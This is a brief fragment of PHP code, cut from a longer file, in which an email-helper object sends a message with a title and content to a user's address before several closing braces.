            $emailRs = $emailClass->sendToUser($user_id, $email_address, $email_title, $email_content);
        }
    }
}
